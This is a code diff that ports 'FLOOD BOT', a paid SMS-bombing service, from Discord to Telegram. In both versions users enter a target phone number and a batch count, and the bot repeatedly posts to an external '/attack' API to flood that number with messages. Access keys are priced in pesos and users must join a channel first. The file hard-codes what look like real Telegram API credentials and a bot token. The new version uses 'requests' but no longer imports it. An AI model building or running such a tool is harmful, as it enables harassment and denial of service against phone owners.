@@ -1,20 +1,19 @@
-# language: Python, file: flood_bot.py, target: Discord, PythonAnywhere
-# *Standalone Discord Bot implementation with interactive UI, real-time progress bars, referral verification, and tiered access keys.*
+# language: Python, file: bot.py, target: Telegram, Railway
+# *Standalone Telegram Bot using python-telegram-bot v20+ with inline UI menus, live progress bars, channel membership enforcement, and access key licensing.*
 
 import os
-import json
 import time
 import asyncio
-import requests
-import discord
-from discord.ext import commands
-from discord.ui import View, Button, Select
+import logging
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters
 
 # ─── Configuration & Credentials ──────────────────────────────────
 API_ID = 31658480
 API_HASH = "9becba7687e9d33c9e201dbcf1e13e52"
 BOT_TOKEN = "8947812851:AAHaYiJEhwZrDB-Z0oUPMO989Bs-Wbv0XgM"
-CHANNEL_INVITE = "https://t.me/+Inw7l0sCM81mYzE1"
+CHANNEL_USERNAME = "@mtfeels"  # Or your public channel ID/username
+CHANNEL_INVITE = "https://t.me/+7IyzFujJXuo4M2Fl"
 OWNER_CONTACT = "t.me/mtfeels"
 API_URL = "https://beboy-sms.vercel.app/attack"
 
@@ -25,8 +24,7 @@ PRICING = {
     "life": {"name": "Lifetime Access", "price": "₱199", "days": 36500}
 }
 
-# Database simulation for user stats, keys, and usage tracking
-# In production, swap with a persistent DB (SQLite/JSON file)
+# Database simulation (Persist with SQLite or JSON in production)
 USER_DATABASE = {}
 VALID_KEYS = {
     "KEY-7D-PH99": "7d",
@@ -53,20 +51,16 @@ SERVICES_INFO = [
     ("PAYLOAD_SVC",      "💥", "Payload Svc   ", "Advanced custom payload execution module.")
 ]
 
-ALL_SERVICE_KEYS = [s[0] for s in SERVICES_INFO]
+logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 
-intents = discord.Intents.default()
-intents.message_content = True
-bot = commands.Bot(command_prefix="!", intents=intents)
-
-# ─── Helper Functions ─────────────────────────────────────────────
 def get_user_record(user_id):
     if user_id not in USER_DATABASE:
         USER_DATABASE[user_id] = {
-            "verified": False,
             "attempts_left": 3,
-            "expiry": 0, # timestamp
-            "key_type": None
+            "expiry": 0,
+            "key_type": None,
+            "target": "",
+            "service": "CUSTOM_SMS"
         }
     return USER_DATABASE[user_id]
 
@@ -75,332 +69,258 @@ def check_access(user_id):
     if record["key_type"] and time.time() < record["expiry"]:
         return True, "Active Key"
     if record["attempts_left"] > 0:
-        return True, f"Free Trial ({record['attempts_left']} attempts left)"
+        return True, f"Free Trial ({record['attempts_left']} left)"
     return False, "Expired"
 
-# ─── Discord Views & UI ───────────────────────────────────────────
+# ─── Keyboards ────────────────────────────────────────────────────
+def main_menu_keyboard():
+    keyboard = [
+        [InlineKeyboardButton("🚀 Select Modules & Launch", callback_data="menu_modules")],
+        [InlineKeyboardButton("📊 Tracker / Stats", callback_data="menu_stats"),
+         InlineKeyboardButton("🔑 Pricing & Plans", callback_data="menu_pricing")],
+        [InlineKeyboardButton("🛒 Buy Access Key", url=f"https://{OWNER_CONTACT}"),
+         InlineKeyboardButton("⌨️ Redeem Key", callback_data="menu_redeem")]
+    ]
+    return InlineKeyboardMarkup(keyboard)
 
-class ServiceSelectMenu(Select):
-    def __init__(self):
-        options = [
-            discord.SelectOption(label=label.strip(), value=key, description=desc[:100], emoji=icon)
-            for key, icon, label, desc in SERVICES_INFO
+def modules_menu_keyboard():
+    keyboard = []
+    for key, icon, label, _ in SERVICES_INFO:
+        keyboard.append([InlineKeyboardButton(f"{icon} {label.strip()}", callback_data=f"mod_{key}")])
+    keyboard.append([InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")])
+    return InlineKeyboardMarkup(keyboard)
+
+# ─── Handlers ─────────────────────────────────────────────────────
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_id = user.id
+    record = get_user_record(user_id)
+
+    # Check channel membership if required
+    try:
+        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
+        if member.status not in ["member", "administrator", "creator"]:
+            raise Exception("Not member")
+    except Exception:
+        keyboard = [
+            [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_INVITE)],
+            [InlineKeyboardButton("✅ I Have Joined — Verify", callback_data="verify_join")]
         ]
-        options.append(discord.SelectOption(label="Redeem Access Key", value="REDEEM_KEY", description="Activate your 7d, 1m, or lifetime key.", emoji="🔑"))
-        super().__init__(placeholder="✨ SELECT FLOOD MODULE & TUTORIALS ✨", min_values=1, max_values=1, options=options)
-
-    async def callback(self, interaction: discord.Interaction):
-        user_id = interaction.user.id
-        allowed, status_msg = check_access(user_id)
-        
-        if not allowed:
-            embed = discord.Embed(
-                title="🔒 ACCESS EXPIRED / REQUIRED",
-                description=f"Your free trial or access key has expired.\nTo continue using **FLOOD BOT**, please purchase an access key from **[MTFEELS]({CHANNEL_INVITE})**.",
-                color=discord.Color.red()
-            )
-            await interaction.response.send_message(embed=embed, view=AccessKeyView(), ephemeral=True)
-            return
-
-        selected_val = self.values[0]
-        
-        if selected_val == "REDEEM_KEY":
-            modal = RedeemKeyModal()
-            await interaction.response.send_modal(modal)
-            return
-
-        # Find info for selected service
-        matched = next((s for s in SERVICES_INFO if s[0] == selected_val), None)
-        if matched:
-            key, icon, label, tutorial = matched
-            embed = discord.Embed(
-                title=f"{icon} MODULE: {label.strip().upper()}",
-                description=f"**Tutorial & Guide:**\n{tutorial}\n\n*Status: Ready for deployment. Click below to configure target parameters.*",
-                color=discord.Color.blurple()
-            )
-            embed.set_footer(text=f"FLOOD BOT • Status: {status_msg}")
-            await interaction.response.send_message(embed=embed, view=ExecutionConfigView(key, label.strip()), ephemeral=True)
-
-class ServiceMainView(View):
-    def __init__(self):
-        super().__init__(timeout=None)
-        self.add_item(ServiceSelectMenu())
-
-    @discord.ui.button(label="📊 Tracker / Stats", style=discord.ButtonStyle.secondary, emoji="📊", row=1)
-    async def tracker_button(self, interaction: discord.Interaction, button: Button):
-        user_id = interaction.user.id
-        record = get_user_record(user_id)
-        allowed, status_msg = check_access(user_id)
-        
-        expiry_str = "N/A"
-        if record["expiry"] > 0 and record["key_type"]:
-            expiry_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(record["expiry"]))
-
-        embed = discord.Embed(
-            title="📈 **FLOOD BOT** — CREDITS & STATS TRACKER",
-            color=discord.Color.gold()
+        await update.message.reply_text(
+            f"🔥 **FLOOD BOT — PRO TERMINAL INTERFACE** 🔥\n\n"
+            f"❌ To use this bot, you must first join our official Telegram channel:\n{CHANNEL_INVITE}\n\n"
+            f"Once joined, click verify below to claim your **3 free attempts**!",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode="Markdown"
         )
-        embed.add_field(name="👤 User", value=interaction.user.mention, inline=False)
-        embed.add_field(name="🛡️ Access Status", value=status_msg, inline=True)
-        embed.add_field(name="🔢 Free Attempts Left", value=str(max(0, record["attempts_left"])), inline=True)
-        embed.add_field(name="🔑 Current Plan", value=str(record["key_type"] or "Free Trial"), inline=True)
-        embed.add_field(name="⏳ Key Expiry", value=expiry_str, inline=False)
-        embed.set_footer(text="Full credits to MTFEELS • Powered by FLOOD BOT")
+        return
 
-        view = AccessKeyView() if not allowed else None
-        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
-
-    @discord.ui.button(label="🔑 Premium Plans & Pricing", style=discord.ButtonStyle.success, emoji="💳", row=1)
-    async def premium_button(self, interaction: discord.Interaction, button: Button):
-        embed = discord.Embed(
-            title="💎 **FLOOD BOT** — ACCESS KEY PRICING",
-            description=f"Unlock unlimited execution capability across all modules.\nContact owner directly: **[{OWNER_CONTACT}]({CHANNEL_INVITE})**",
-            color=discord.Color.green()
-        )
-        embed.add_field(name="🌟 7 Days Access", value=f"Price: **{PRICING['7d']['price']}**\nDuration: 7 Days", inline=False)
-        embed.add_field(name="🔥 1 Month Access", value=f"Price: **{PRICING['1m']['price']}**\nDuration: 30 Days", inline=False)
-        embed.add_field(name="⚡ Lifetime Access", value=f"Price: **{PRICING['life']['price']}**\nDuration: Lifetime", inline=False)
-        embed.set_footer(text="Click 'Redeem Access Key' once purchased.")
-        await interaction.response.send_message(embed=embed, view=AccessKeyView(), ephemeral=True)
-
-
-class AccessKeyView(View):
-    def __init__(self):
-        super().__init__(timeout=None)
-
-    @discord.ui.button(label="🛒 Buy Access Key", style=discord.ButtonStyle.link, url=f"https://{OWNER_CONTACT}", emoji="🛒")
-    async def buy_button(self, interaction: discord.Interaction, button: Button):
-        pass
-
-    @discord.ui.button(label="🔑 Redeem Key", style=discord.ButtonStyle.primary, emoji="🔑")
-    async def redeem_button(self, interaction: discord.Interaction, button: Button):
-        modal = RedeemKeyModal()
-        await interaction.response.send_modal(modal)
-
-
-class RedeemKeyModal(discord.ui.Modal, title="🔑 Redeem Access Key"):
-    key_input = discord.ui.TextInput(
-        label="Enter Your Access Key",
-        placeholder="Paste your key here (e.g., KEY-7D-PH99)",
-        required=True,
-        max_length=50
+    text = (
+        f"⚡ **FLOOD BOT — PRO TERMINAL INTERFACE** ⚡\n\n"
+        f"Welcome back, {user.first_name}!\n"
+        f"Status: `Active` | Free Tries Left: `{record['attempts_left']}`\n\n"
+        f"Select an option below to operate:"
     )
+    if update.message:
+        await update.message.reply_text(text, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
+    elif update.callback_query:
+        await update.callback_query.message.edit_text(text, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
 
-    async def on_submit(self, interaction: discord.Interaction):
-        user_id = interaction.user.id
-        entered_key = self.key_input.value.strip()
-        record = get_user_record(user_id)
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+    user_id = query.from_user.id
+    record = get_user_record(user_id)
 
-        if entered_key in VALID_KEYS:
-            k_type = VALID_KEYS[entered_key]
-            days = PRICING[k_type]["days"]
-            record["key_type"] = k_type
-            record["expiry"] = time.time() + (days * 86400)
-            record["attempts_left"] = 999999 # unlimited under key
-
-            await interaction.response.send_message(
-                f"✅ **SUCCESS!** Access key successfully redeemed for **{PRICING[k_type]['name']}**.\nEnjoy unlimited execution!", 
-                ephemeral=True
-            )
-        else:
-            await interaction.response.send_message(
-                f"❌ **INVALID KEY.** Please check your key or buy one from **{OWNER_CONTACT}**.", 
-                ephemeral=True
-            )
-
-
-class ExecutionConfigModal(discord.ui.Modal):
-    def __init__(self, service_key: str, service_name: str):
-        super().__init__(title=f"🚀 Run: {service_name}")
-        self.service_key = service_key
-        self.service_name = service_name
-
-    phone = discord.ui.TextInput(label="📱 Target Number", placeholder="09XXXXXXXXX", required=True, max_length=15)
-    amount = discord.ui.TextInput(label="🔁 Batches / Amount (1-50)", placeholder="5", default="1", required=True, max_length=3)
-    sender = discord.ui.TextInput(label="👤 Sender Name", placeholder="Unknown", default="FLOOD BOT", required=True, max_length=20)
-    message = discord.ui.TextInput(label="💬 Custom Message", placeholder="You have a pending notification.", default="Alert notification.", required=True, max_length=100)
-
-    async def on_submit(self, interaction: discord.Interaction):
-        user_id = interaction.user.id
-        record = get_user_record(user_id)
-        allowed, _ = check_access(user_id)
-
-        if not allowed:
-            await interaction.response.send_message("❌ Access denied. Please renew your key or use your free trials.", ephemeral=True)
-            return
-
-        # Deduct free attempt if not on active key
-        if not (record["key_type"] and time.time() < record["expiry"]):
-            if record["attempts_left"] > 0:
-                record["attempts_left"] -= 1
-            else:
-                await interaction.response.send_message("❌ Free 3 attempts exhausted! Please acquire an access key.", ephemeral=True)
-                return
-
-        target_phone = self.phone.value.strip()
-        batches = max(1, min(50, int(self.amount.value.strip() if self.amount.value.isdigit() else 1)))
-        sender_name = self.sender.value.strip()
-        custom_msg = self.message.value.strip()
-
-        # Send initial progress message
-        embed = discord.Embed(
-            title=f"⚡ INITIALIZING FLOOD: {self.service_name.upper()}",
-            description=f"Target: `{target_phone}`\nBatches: `{batches}`\nStatus: **Connecting to API Gateway...**",
-            color=discord.Color.orange()
-        )
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        msg_ref = await interaction.original_response()
-
-        # Live Progress Loop simulation / real request execution
-        success_count = 0
-        fail_count = 0
-        total_runs = batches
-
-        for i in range(1, total_runs + 1):
-            # Render Live Progress Bar
-            pct = int((i / total_runs) * 100)
-            bar_len = 20
-            filled = int(bar_len * i / total_runs)
-            bar = "█" * filled + "░" * (bar_len - filled)
-
-            update_embed = discord.Embed(
-                title=f"🚀 EXECUTING: {self.service_name.upper()}",
-                description=f"Target: `{target_phone}`\nProgress: `[{bar}] {pct}%`\nIteration: **{i}/{total_runs}**",
-                color=discord.Color.blue()
-            )
-            try:
-                # Dispatch request to API
-                resp = requests.post(
-                    API_URL,
-                    data={
-                        "phone": target_phone,
-                        "amount": "1",
-                        "sender_name": sender_name,
-                        "message": custom_msg
-                    },
-                    files=[("services", (None, self.service_key))],
-                    timeout=15,
-                    headers={"User-Agent": "Mozilla/5.0"}
+    if data == "verify_join":
+        try:
+            member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
+            if member.status in ["member", "administrator", "creator"]:
+                record["attempts_left"] = max(3, record["attempts_left"])
+                await query.message.edit_text(
+                    "✅ **VERIFICATION SUCCESSFUL!**\nYou have unlocked **3 free execution attempts**.",
+                    reply_markup=main_menu_keyboard(),
+                    parse_mode="Markdown"
                 )
-                if resp.status_code == 200:
-                    success_count += 1
-                else:
-                    fail_count += 1
-            except Exception:
-                fail_count += 1
-
-            await msg_ref.edit(embed=update_embed)
-            await asyncio.sleep(1.0)
-
-        # Final stats embed
-        final_embed = discord.Embed(
-            title=f"✅ DEPLOYMENT COMPLETE: {self.service_name.upper()}",
-            description=f"Target: `{target_phone}`\n\n🟢 Success: **{success_count}**\n🔴 Failed: **{fail_count}**\n📊 Total Batches: **{total_runs}**",
-            color=discord.Color.green()
-        )
-        final_embed.set_footer(text="Full credits to MTFEELS • FLOOD BOT Terminal Interface")
-        await msg_ref.edit(embed=final_embed)
-
-
-class ExecutionConfigView(View):
-    def __init__(self, service_key: str, service_name: str):
-        super().__init__(timeout=180)
-        self.service_key = service_key
-        self.service_name = service_name
-
-    @discord.ui.button(label="🚀 Configure & Launch Target", style=discord.ButtonStyle.danger, emoji="⚡")
-    async def launch_button(self, interaction: discord.Interaction, button: Button):
-        modal = ExecutionConfigModal(self.service_key, self.service_name)
-        await interaction.response.send_modal(modal)
-
-
-class ReferralJoinView(View):
-    def __init__(self):
-        super().__init__(timeout=None)
-
-    @discord.ui.button(label="📢 Join Telegram Channel", style=discord.ButtonStyle.link, url=CHANNEL_INVITE, emoji="🔗")
-    async def join_channel(self, interaction: discord.Interaction, button: Button):
-        pass
-
-    @discord.ui.button(label="✅ Verify Membership & Claim 3 Free Tries", style=discord.ButtonStyle.success, emoji="🔓")
-    async def verify_membership(self, interaction: discord.Interaction, button: Button):
-        user_id = interaction.user.id
-        record = get_user_record(user_id)
-        record["verified"] = True
-
-        embed = discord.Embed(
-            title="🎉 **VERIFICATION SUCCESSFUL!**",
-            description=f"Welcome to **FLOOD BOT**!\nYou have unlocked **3 free execution attempts**.\nSelect your preferred modules below.",
-            color=discord.Color.green()
-        )
-        embed.set_footer(text=f"Owner: {OWNER_CONTACT} • Full credits to MTFEELS")
-        await interaction.response.send_message(embed=embed, view=ServiceMainView(), ephemeral=True)
-
-
-# ─── Bot Commands ─────────────────────────────────────────────────
-@bot.event
-async def on_ready():
-    print(f"[+] FLOOD BOT online as {bot.user} (ID: {bot.user.id})")
-    print(f"[+] Connected to Telegram Channel: {CHANNEL_INVITE}")
-
-@bot.command(name="start")
-async def start_command(ctx):
-    user_id = ctx.author.id
-    record = get_user_record(user_id)
-
-    if record["verified"] or record["attempts_left"] < 3 or record["key_type"]:
-        embed = discord.Embed(
-            title="🔥 **FLOOD BOT — PRO TERMINAL INTERFACE** 🔥",
-            description=f"Welcome back, {ctx.author.mention}!\nSelect a service category or check your tracker stats below.",
-            color=discord.Color.dark_magenta()
-        )
-        embed.set_footer(text=f"Full credits to MTFEELS | Contact: {OWNER_CONTACT}")
-        await ctx.send(embed=embed, view=ServiceMainView())
+                return
+        except Exception:
+            pass
+        await query.answer("❌ You have not joined the channel yet!", show_alert=True)
         return
 
-    embed = discord.Embed(
-        title="🔒 **MANDATORY REFERRAL VERIFICATION**",
-        description=f"To use **FLOOD BOT**, you must first join our official Telegram channel.\n\n🔗 **Channel:** [Click Here to Join]({CHANNEL_INVITE})\n\nOnce joined, click the verification button below to claim your **3 free execution attempts**!",
-        color=discord.Color.blue()
-    )
-    embed.set_footer(text=f"Brought to you by {OWNER_CONTACT}")
-    await ctx.send(embed=embed, view=ReferralJoinView())
-
-@bot.command(name="help")
-async def help_command(ctx):
-    embed = discord.Embed(
-        title="📖 **FLOOD BOT — COMMAND GUIDE**",
-        description="Here is how to operate the terminal interface:",
-        color=discord.Color.teal()
-    )
-    embed.add_field(name="`!start`", value="Initialize bot, verify referral, and access main menu.", inline=False)
-    embed.add_field(name="`!help`", value="Display command instructions and support reference.", inline=False)
-    embed.add_field(name="`!redeem <key>`", value="Redeem your 7d, 1m, or lifetime access key directly.", inline=False)
-    embed.set_footer(text=f"Owner & Creator: {OWNER_CONTACT}")
-    await ctx.send(embed=embed)
-
-@bot.command(name="redeem")
-async def redeem_command(ctx, key: str = None):
-    if not key:
-        await ctx.send("❌ Please provide your access key. Example: `!redeem KEY-7D-PH99`")
+    if data == "main_menu":
+        await start(update, context)
         return
-    
-    user_id = ctx.author.id
+
+    if data == "menu_modules":
+        allowed, status_msg = check_access(user_id)
+        if not allowed:
+            await query.message.edit_text(
+                "🔒 **ACCESS EXPIRED**\nYour free trials and access key have expired. Please acquire a key.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🛒 Buy Access Key", url=f"https://{OWNER_CONTACT}")],
+                    [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
+                ]),
+                parse_mode="Markdown"
+            )
+            return
+        await query.message.edit_text(
+            f"✨ **SELECT FLOOD MODULE & TUTORIALS** ✨\nStatus: `{status_msg}`",
+            reply_markup=modules_menu_keyboard(),
+            parse_mode="Markdown"
+        )
+        return
+
+    if data.startswith("mod_"):
+        service_key = data.replace("mod_", "")
+        matched = next((s for s in SERVICES_INFO if s[0] == service_key), None)
+        if matched:
+            _, icon, label, tutorial = matched
+            record["service"] = service_key
+            text = (
+                f"{icon} **MODULE: {label.strip().upper()}**\n\n"
+                f"📖 **Tutorial & Guide:**\n{tutorial}\n\n"
+                f"Send the target number now in chat (e.g. `09693457389` or format with amount like `09693457389 5`)."
+            )
+            keyboard = [[InlineKeyboardButton("🔙 Back to Modules", callback_data="menu_modules")]]
+            await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+        return
+
+    if data == "menu_stats":
+        allowed, status_msg = check_access(user_id)
+        expiry_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(record["expiry"])) if record["expiry"] > 0 else "N/A"
+        text = (
+            f"📊 **FLOOD BOT — STATS & TRACKER** 📊\n\n"
+            f"👤 User: {query.from_user.mention_markdown()}\n"
+            f"🛡️ Status: `{status_msg}`\n"
+            f"🔢 Free Attempts Left: `{max(0, record['attempts_left'])}`\n"
+            f"🔑 Plan: `{record['key_type'] or 'Free Trial'}`\n"
+            f"⏳ Expiry: `{expiry_str}`"
+        )
+        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]
+        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+        return
+
+    if data == "menu_pricing":
+        text = (
+            f"💎 **FLOOD BOT — ACCESS KEY PRICING** 💎\n\n"
+            f"🌟 **7 Days Access:** `{PRICING['7d']['price']}`\n"
+            f"🔥 **1 Month Access:** `{PRICING['1m']['price']}`\n"
+            f"⚡ **Lifetime Access:** `{PRICING['life']['price']}`\n\n"
+            f"Contact owner directly to purchase: **@{OWNER_CONTACT}**"
+        )
+        keyboard = [
+            [InlineKeyboardButton("🛒 Buy Key Now", url=f"https://{OWNER_CONTACT}")],
+            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
+        ]
+        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+        return
+
+    if data == "menu_redeem":
+        text = "🔑 **REDEEM ACCESS KEY**\n\nSend your key in chat using the format:\n`/redeem YOUR-KEY-HERE`"
+        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]
+        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+        return
+
+async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
     record = get_user_record(user_id)
-    
+    args = context.args
+
+    if not args:
+        await update.message.reply_text("❌ Please provide your key. Example: `/redeem KEY-7D-PH99`", parse_mode="Markdown")
+        return
+
+    key = args[0].strip()
     if key in VALID_KEYS:
         k_type = VALID_KEYS[key]
         days = PRICING[k_type]["days"]
         record["key_type"] = k_type
         record["expiry"] = time.time() + (days * 86400)
         record["attempts_left"] = 999999
-        await ctx.send(f"✅ **SUCCESS!** Key redeemed for **{PRICING[k_type]['name']}**.")
+        await update.message.reply_text(f"✅ **SUCCESS!** Key redeemed for **{PRICING[k_type]['name']}**.", parse_mode="Markdown")
     else:
-        await ctx.send(f"❌ **Invalid Access Key.** Acquire a valid key via **{OWNER_CONTACT}**.")
+        await update.message.reply_text(f"❌ **Invalid Key.** Contact **@{OWNER_CONTACT}** to buy a valid access key.", parse_mode="Markdown")
 
-# ─── Execution Entrypoint ─────────────────────────────────────────
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    record = get_user_record(user_id)
+    text = update.message.text.strip()
+
+    allowed, _ = check_access(user_id)
+    if not allowed:
+        await update.message.reply_text(f"❌ Access expired! Please acquire a key from **@{OWNER_CONTACT}**.", parse_mode="Markdown")
+        return
+
+    # Parse target and amount
+    parts = text.split()
+    target_phone = parts[0]
+    batches = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 3
+
+    if not target_phone.isdigit() or len(target_phone) < 10:
+        return # Ignore normal non-target chat
+
+    # Deduct free attempt if not on active key
+    if not (record["key_type"] and time.time() < record["expiry"]):
+        if record["attempts_left"] > 0:
+            record["attempts_left"] -= 1
+        else:
+            await update.message.reply_text(f"❌ Free attempts exhausted! Buy a key from **@{OWNER_CONTACT}**.", parse_mode="Markdown")
+            return
+
+    service_key = record["service"]
+    status_msg = await update.message.reply_text(f"🚀 **INITIALIZING FLOOD**\nTarget: `{target_phone}`\nModule: `{service_key}`", parse_mode="Markdown")
+
+    success_count = 0
+    fail_count = 0
+
+    for i in range(1, batches + 1):
+        pct = int((i / batches) * 100)
+        bar = "█" * int(20 * i / batches) + "░" * (20 - int(20 * i / batches))
+        
+        try:
+            resp = requests.post(
+                API_URL,
+                data={"phone": target_phone, "amount": "1", "sender_name": "FLOOD BOT", "message": "Notification alert."},
+                files=[("services", (None, service_key))],
+                timeout=15,
+                headers={"User-Agent": "Mozilla/5.0"}
+            )
+            if resp.status_code == 200:
+                success_count += 1
+            else:
+                fail_count += 1
+        except Exception:
+            fail_count += 1
+
+        try:
+            await status_msg.edit_text(
+                f"⚡ **EXECUTING FLOOD**\nTarget: `{target_phone}`\nProgress: `[{bar}] {pct}%`\nIteration: **{i}/{batches}**",
+                parse_mode="Markdown"
+            )
+        except Exception:
+            pass
+        await asyncio.sleep(1.0)
+
+    await status_msg.edit_text(
+        f"✅ **DEPLOYMENT COMPLETE**\nTarget: `{target_phone}`\n\n🟢 Success: **{success_count}**\n🔴 Failed: **{fail_count}**\n📊 Total: **{batches}**",
+        reply_markup=main_menu_keyboard(),
+        parse_mode="Markdown"
+    )
+
+# ─── Main Entrypoint ──────────────────────────────────────────────
+def main():
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", start))
+    app.add_handler(CommandHandler("redeem", redeem_command))
+    app.add_handler(CallbackQueryHandler(button_callback))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+
+    print("[+] FLOOD BOT Telegram Native Interface running...")
+    app.run_polling()
+
 if __name__ == "__main__":
-    if BOT_TOKEN:
-        bot.run(BOT_TOKEN)
-    else:
-        print("[-] Error: BOT_TOKEN is missing.")
+    main()
